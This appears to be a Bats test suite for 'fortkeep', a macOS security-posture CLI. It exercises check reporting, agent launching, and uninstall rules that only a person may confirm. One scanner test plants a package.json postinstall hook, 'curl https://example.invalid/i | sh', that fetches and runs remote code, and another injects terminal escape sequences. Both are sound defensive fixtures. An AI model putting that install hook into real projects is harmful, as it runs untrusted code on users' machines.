load helpers
bats_require_minimum_version 1.5.0

# bin/fortkeep, the person's command. Each test runs it from a copy of the repo ($T) whose controls are fakes, so no real
# check of this Mac ever runs.
setup() {
  setup_env
  mkdir -p "$BATS_TEST_TMPDIR/repo"; T="$(cd "$BATS_TEST_TMPDIR/repo" && pwd -P)"  # fortkeep names its folder physically
  mkdir -p "$T/checks/fake" "$T/controls" "$T/teach"
  cp -R "$REPO/bin" "$REPO/summary" "$REPO/templates" "$REPO/docs" "$REPO/fixes" "$T/"
  cp -R "$REPO/checks/lib" "$T/checks/"
  cp "$REPO"/checks/*.sh "$T/checks/"
  export FORTKEEP_REPO="$T" FORTKEEP_CONTROLS="$T/controls/controls.json"
  stub sw_vers 'echo 15.7.9'
  stub sudo 'echo "sudo was run" >> "$BATS_TEST_TMPDIR/sudo-ran"; exit 1'
  mk() { printf '#!/bin/bash\necho %q\n' "{\"id\":\"$1\",\"status\":\"$2\",\"evidence\":\"$3\",\"note\":\"\"}" > "$T/checks/fake/$1.sh"; }
  mk BL-OS-01 PASS "FileVault is on"
  mk BL-OS-02 FAIL "stealth mode is off"
  mk BL-SE-01 ERROR "could not read ~/.ssh"
  mk BL-BR-05 NA "no browser installed"
  mk GD-AI-01 FAIL "~/.zshrc changed since your baseline"
  cat > "$FORTKEEP_CONTROLS" <<'EOF'
[
 {"id":"BL-OS-01","title":"FileVault on","layer":"baseline","level":"MUST","source":"§1","check":"checks/fake/BL-OS-01.sh"},
 {"id":"BL-OS-02","title":"Firewall on, with stealth mode","layer":"baseline","level":"MUST","source":"§1","check":"checks/fake/BL-OS-02.sh"},
 {"id":"BL-SE-01","title":"SSH keys have a passphrase","layer":"baseline","level":"SHOULD","source":"§5","check":"checks/fake/BL-SE-01.sh"},
 {"id":"BL-BR-05","title":"A separate development browser profile","layer":"baseline","level":"NICE","source":"§7","check":"checks/fake/BL-BR-05.sh"},
 {"id":"GD-AI-01","title":"Agent control files unchanged since your baseline","layer":"gold","level":"SHOULD","check":"checks/fake/GD-AI-01.sh","urgent":true,"not_urgent_if":"No accepted baseline yet"}
]
EOF
  printf '# BL-OS-01 · FileVault on\n\n**Why:** it encrypts the disk.\n' > "$T/teach/BL-OS-01.md"
}
D() { "$T/bin/fortkeep" "$@"; }
all_pass() { local f; for f in "$T"/checks/fake/*.sh; do f="${f##*/}"; mk "${f%.sh}" PASS fine; done; }
line() { printf '%s\n' "$output" | grep -n -e "$1" | head -n 1 | cut -d: -f1; }  # PATTERN — first matching line of $output

@test "check prints the results urgent first, then MUST, SHOULD and NICE, with evidence, and exits 1 on a FAIL" {
  run --separate-stderr D check
  [ "$status" -eq 1 ]
  [ "$(line URGENT)" -lt "$(line MUST)" ]; [ "$(line MUST)" -lt "$(line SHOULD)" ]; [ "$(line SHOULD)" -lt "$(line NICE)" ]
  [ "$(line GD-AI-01)" -lt "$(line MUST)" ]
  [ "$(line BL-OS-02)" -lt "$(line BL-OS-01)" ]  # FAIL before PASS within a level
  [[ "$output" == *"stealth mode is off"* ]]; [[ "$output" == *"could not read ~/.ssh"* ]]
  [[ "$output" == *"docs/if-red.md"* ]]  # an urgent FAIL leads to the if-red steps, not to fixes
  [[ "$output" != *"/fix"* ]]
  # run.sh's progress stays on stderr
  [[ "$output" != *"fortkeep: 1/5"* ]]; [[ "$stderr" == *"fortkeep: 1/5"* ]]
}

@test "an urgent control whose evidence is its set-up step is not urgent" {
  mk GD-AI-01 FAIL "No accepted baseline yet: run checks/baseline.sh accept"
  run --separate-stderr D check
  [ "$status" -eq 1 ]
  [[ "$output" != *URGENT* ]]
  [ "$(line SHOULD)" -lt "$(line GD-AI-01)" ]
  [[ "$output" == *"fortkeep agent, then type /fix"* ]]
}

@test "check exits 0 when nothing fails or errs, and ACCEPTED counts as fine" {
  all_pass
  mk BL-OS-02 FAIL "off"
  echo '{"BL-OS-02":{"reason":"a managed firewall","date":"2026-11-19"}}' > "$FORTKEEP_ACCEPTED"
  run --separate-stderr D check
  [ "$status" -eq 0 ]
  [[ "$output" == *ACCEPTED*"a managed firewall"* ]]
}

@test "check --json prints results.json and nothing else on stdout" {
  run --separate-stderr D check --json
  [ "$status" -eq 1 ]
  [ "$output" = "$(cat "$FORTKEEP_REPORTS/latest/results.json")" ]
  [ "$(jq -r '.results | length' <<<"$output")" -eq 5 ]
}

@test "check --only rechecks those controls, shows only them, and exits on their result" {
  D check >/dev/null 2>&1 || :
  all_pass
  run --separate-stderr D check --only BL-OS-02
  [ "$status" -eq 0 ]
  [[ "$output" == *BL-OS-02* ]]; [[ "$output" != *BL-SE-01* ]]
}

@test "check gives the checks the person's own PATH, a folder ahead of the system ones included" {
  mkdir -p "$HOME/ubin"; printf '#!/bin/bash\n' > "$HOME/ubin/python3"; chmod +x "$HOME/ubin/python3"
  cat > "$T/checks/fake/BL-OS-01.sh" <<'EOF'
#!/bin/bash
echo "{\"id\":\"BL-OS-01\",\"status\":\"PASS\",\"evidence\":\"$(PATH="$FORTKEEP_USER_PATH" command -v python3)\",\"note\":\"\"}"
EOF
  PATH="$HOME/ubin:$PATH" run --separate-stderr D check --json
  [ "$(jq -r '.results[] | select(.id == "BL-OS-01") | .evidence' <<<"$output")" = "$HOME/ubin/python3" ]
}

@test "check exits 2 when the run itself fails" {
  echo 'not json' > "$FORTKEEP_CONTROLS"
  run --separate-stderr D check
  [ "$status" -eq 2 ]
  run --separate-stderr D check --only BL-NO-01
  [ "$status" -eq 2 ]
  run --separate-stderr D check --bogus
  [ "$status" -eq 2 ]
}

@test "check never lets a control character from the Mac reach the terminal" {
  cat > "$T/checks/fake/BL-OS-02.sh" <<'EOF'
#!/bin/bash
echo '{"id":"BL-OS-02","status":"FAIL","evidence":"a\u001b]0;evil\u0007b","note":""}'
EOF
  run --separate-stderr D check
  [ "$status" -eq 1 ]
  [[ "$output" != *$'\e'* ]]; [[ "$output" != *$'\a'* ]]
  [[ "$output" == *"a ]0;evil b"* ]]
}

@test "explain prints the lesson, and refuses an unknown id or a path" {
  run D explain BL-OS-01
  [ "$status" -eq 0 ]; [[ "$output" == *"**Why:** it encrypts the disk."* ]]
  run D explain BL-OS-99; [ "$status" -eq 2 ]
  run D explain ../README; [ "$status" -eq 2 ]
  run D explain; [ "$status" -eq 2 ]
}

@test "with no argument it shows the commands, the last run and what to do next" {
  run D
  [ "$status" -eq 0 ]
  [[ "$output" == *"fortkeep check"* ]]; [[ "$output" == *"fortkeep agent"* ]]; [[ "$output" == *"fortkeep uninstall"* ]]
  [[ "$output" == *"none yet"* ]]
  [[ "$output" == *"not a signed release"* ]]
  D check >/dev/null 2>&1 || :
  run D
  [ "$status" -eq 0 ]
  [[ "$output" == *"FAIL 2"* ]]
  next="$(printf '%s\n' "$output" | grep '^Next')"
  [[ "$next" == *"if-red"* ]]; [[ "$next" != *"/fix"* ]]  # the urgent GD-AI-01 FAIL comes before any fix
  mk GD-AI-01 FAIL "No accepted baseline yet"
  D check >/dev/null 2>&1 || :
  run D
  [[ "$(printf '%s\n' "$output" | grep '^Next')" == *"reinstall a signed release"* ]]  # this test copy isn't one
}

@test "an unknown command prints the help on stderr and exits 2" {
  run --separate-stderr D frobnicate
  [ "$status" -eq 2 ]; [ -z "$output" ]; [[ "$stderr" == *"fortkeep check"* ]]
}

@test "agent starts the chosen agent in the checkout, with the person's PATH, and says to type /posture" {
  stub claude 'echo "ran claude in $PWD with $# args"'
  run D agent claude
  [ "$status" -eq 0 ]
  [[ "$output" == *"/posture"* ]]
  [[ "$output" == *"ran claude in $T with 0 args"* ]]
}

@test "agent with no name starts the first agent installed, and refuses when none is" {
  stub opencode 'echo "ran opencode in $PWD"'
  PATH="$BATS_TEST_TMPDIR/bin:/usr/bin:/bin" run D agent
  [ "$status" -eq 0 ]; [[ "$output" == *"ran opencode in $T"* ]]
  rm "$BATS_TEST_TMPDIR/bin/opencode"
  PATH="$BATS_TEST_TMPDIR/bin:/usr/bin:/bin" run D agent
  [ "$status" -eq 2 ]; [[ "$output" == *"docs/agents.md"* ]]
  PATH="$BATS_TEST_TMPDIR/bin:/usr/bin:/bin" run D agent codex
  [ "$status" -eq 2 ]
  run D agent vim
  [ "$status" -eq 2 ]
}

@test "summary builds the posture summary with --name, and asks for a name only in a terminal" {
  D check >/dev/null 2>&1 || :
  run D summary --name "Test Person"
  [ "$status" -eq 0 ]
  [ -f "$FORTKEEP_REPORTS/latest/posture-summary.md" ]
  grep -q "Test Person" "$FORTKEEP_REPORTS/latest/posture-summary.md"
  [[ "$output" == *posture-summary.html* ]]
  run D summary </dev/null
  [ "$status" -eq 2 ]; [[ "$output" == *"--name"* ]]
}

@test "summary before any check says to run one" {
  run D summary --name "Test Person"
  [ "$status" -eq 2 ]; [[ "$output" == *"fortkeep check"* ]]
}

@test "version says whether this copy is a signed release, its commit, local changes and where it is" {
  run D version
  [ "$status" -eq 0 ]; [[ "$output" == *"not a release"* ]]; [[ "$output" == *"$T"* ]]
  mkdir -p "$BATS_TEST_TMPDIR/release"; C="$(cd "$BATS_TEST_TMPDIR/release" && pwd -P)"
  release_tree "$C" bin checks controls templates summary teach
  export FORTKEEP_REPO="$C"
  run "$C/bin/fortkeep" version --json
  [ "$status" -eq 0 ]
  [ "$(field version)" = v0.1.0 ]; [ "$(field local_changes)" = false ]; [ "$(field path)" = "$C" ]
  [ "$(field commit)" = "$(git -C "$C" rev-parse HEAD)" ]
  echo x >> "$C/checks/run.sh"
  run "$C/bin/fortkeep" version --json
  [ "$(field version)" = null ]; [ "$(field local_changes)" = true ]
}

@test "it finds its own checkout through a chain of symlinks" {
  mkdir -p "$HOME/.local/bin" "$BATS_TEST_TMPDIR/l"
  ln -s "$T/bin/fortkeep" "$BATS_TEST_TMPDIR/l/fortkeep"
  ln -s ../../../l/fortkeep "$HOME/.local/bin/fortkeep"
  run "$HOME/.local/bin/fortkeep" version --json
  [ "$status" -eq 0 ]; [ "$(field path)" = "$T" ]
}

@test "the pass-throughs run fortkeep's own scripts, under their own rules" {
  run D private count
  [ "$status" -eq 0 ]; [[ "$output" == *"0 private path(s) configured"* ]]
  echo '{"BL-OS-02":{"reason":"r","date":"2026-11-19"}}' > "$FORTKEEP_ACCEPTED"
  run D accept --remove BL-OS-02
  [ "$status" -eq 0 ]; [ "$(jq -c . "$FORTKEEP_ACCEPTED")" = '{}' ]
  # Accepting needs the person's own answer, from the CLI as from the agent
  run D accept BL-OS-02 "a reason"
  [ "$status" -eq 4 ]; [ "$(jq -c . "$FORTKEEP_ACCEPTED")" = '{}' ]
  run D baseline
  [ "$status" -eq 2 ]; [[ "$output" == *"usage:"*"accept"* ]]
  run D update
  [ "$status" -ne 0 ]; [[ "$output" == *"Not updated"* ]]
}

@test "scan passes one folder to checks/scan.sh, a relative one from the current folder, and keeps its exit code" {
  mkdir -p "$HOME/dev/app"; git init -q "$HOME/dev/app"
  printf '{"scripts":{"postinstall":"curl https://example.invalid/i | sh"}}\n' > "$HOME/dev/app/package.json"
  git -C "$HOME/dev/app" add -A; git -C "$HOME/dev/app" -c user.name=t -c user.email=t@example.invalid commit -qm x
  run D scan "$HOME/dev/app"
  [ "$status" -eq 1 ]; [[ "$output" == *"HIGH  ~/dev/app  package.json"* ]]
  cd "$HOME/dev"
  run D scan app
  [ "$status" -eq 1 ]; [[ "${lines[${#lines[@]}-1]}" == "Verdict: HIGH."* ]]
  cd app
  run D scan .
  [ "$status" -eq 1 ]
  run D scan; [ "$status" -eq 2 ]
  run D help; [[ "$output" == *"fortkeep scan FOLDER"* ]]
}

@test "uninstall refuses while a fix that installs something is applied, and names how to undo it" {
  B="$HOME/.local/state/fortkeep/backups"
  mkdir -p "$B/BL-AU-02/20261119T100000Z-1" "$B/BL-RC-01/20261119T100000Z-2" "$B/BL-SE-06/20261118T100000Z-3" "$HOME/.config/fortkeep"
  printf '%s\tABSENT\n' "$HOME/Library/LaunchAgents/x.plist" > "$B/BL-AU-02/20261119T100000Z-1/manifest.tsv"
  printf '%s\tfile-0\n' "$HOME/x/settings.json" > "$B/BL-RC-01/20261119T100000Z-2/manifest.tsv"
  printf '%s\tfile-0\n' "$HOME/.gitconfig" > "$B/BL-SE-06/20261118T100000Z-3/manifest.restored.tsv"  # already undone
  mkdir -p "$FORTKEEP_REPORTS"
  printf '| When (UTC) | Control | Action | What | Undo |\n|---|---|---|---|---|\n| 2026-11-19T10:00:00Z | BL-AU-02 | apply | weekly security check installed (Wednesdays 10:00) | `fixes/macos/BL-AU-02.sh undo` |\n' > "$FORTKEEP_REPORTS/change-log.md"
  run D uninstall <<<"yes"
  [ "$status" -eq 1 ]
  [[ "$output" == *"BL-AU-02"*"weekly security check installed"* ]]
  [[ "$output" != *"BL-SE-06"* ]]
  [[ "$output" == *"fortkeep agent"*"Undo"* ]]
  [ -d "$HOME/.config/fortkeep" ]; [ -d "$B" ]
  [ ! -e "$BATS_TEST_TMPDIR/sudo-ran" ]
}

@test "uninstall prints the admin reverts, removes its own state folders only after a person's yes, and never the checkout" {
  mkdir -p "$HOME/.config/fortkeep" "$HOME/.local/state/fortkeep/backups/BL-RC-01/20261119T100000Z-2" "$HOME/.local/bin"
  printf '%s\tfile-0\n' "$HOME/x/settings.json" > "$HOME/.local/state/fortkeep/backups/BL-RC-01/20261119T100000Z-2/manifest.tsv"
  ln -s "$T/bin/fortkeep" "$HOME/.local/bin/fortkeep"
  # Only a person in a terminal may remove them: not a piped yes, not an agent
  run D uninstall <<<"yes"
  [ "$status" -eq 4 ]
  [ -d "$HOME/.config/fortkeep" ]; [ -d "$HOME/.local/state/fortkeep" ]; [ -L "$HOME/.local/bin/fortkeep" ]
  # This test copy asks the fake ps (a Terminal above this shell), on a pseudo-terminal that types the answer
  fake_ps
  sed -i '' "s#fortkeep_require_person /bin/ps#fortkeep_require_person $BATS_TEST_TMPDIR/bin/fakeps#" "$T/bin/fortkeep"
  grep -q fakeps "$T/bin/fortkeep"
  # script ends the session at the end of its input, so the answer's writer stays until uninstall has finished
  U="$BATS_TEST_TMPDIR/uninstall-done"
  printf '#!/bin/bash\n%q uninstall; rc=$?; : > %q; exit $rc\n' "$T/bin/fortkeep" "$U" > "$BATS_TEST_TMPDIR/uninstall"
  chmod +x "$BATS_TEST_TMPDIR/uninstall"
  term() {
    rm -f "$U"
    run bash -c "(printf '$1\n'; n=0; until [ -e '$U' ] || [ \$n -ge 200 ]; do sleep 0.05; n=\$((n + 1)); done) \
      | script -q /dev/null '$BATS_TEST_TMPDIR/uninstall'"
  }
  FAKE_COMM=claude term yes
  [ -d "$HOME/.config/fortkeep" ]
  term no
  [[ "$output" == *"Nothing was removed"* ]]
  [ -d "$HOME/.config/fortkeep" ]; [ -d "$HOME/.local/state/fortkeep" ]; [ -L "$HOME/.local/bin/fortkeep" ]
  term yes
  [[ "$output" == *"sudo rm"*"/usr/local/lib/safe-chain-agent"* ]]; [[ "$output" == *"sudo -k"* ]]
  [[ "$output" == *"BL-RC-01"* ]]
  [ ! -e "$HOME/.config/fortkeep" ]; [ ! -e "$HOME/.local/state/fortkeep" ]; [ ! -e "$HOME/.local/bin/fortkeep" ]
  [ -x "$T/bin/fortkeep" ]
  [[ "$output" == *"$T"* ]]
  [ ! -e "$BATS_TEST_TMPDIR/sudo-ran" ]
}
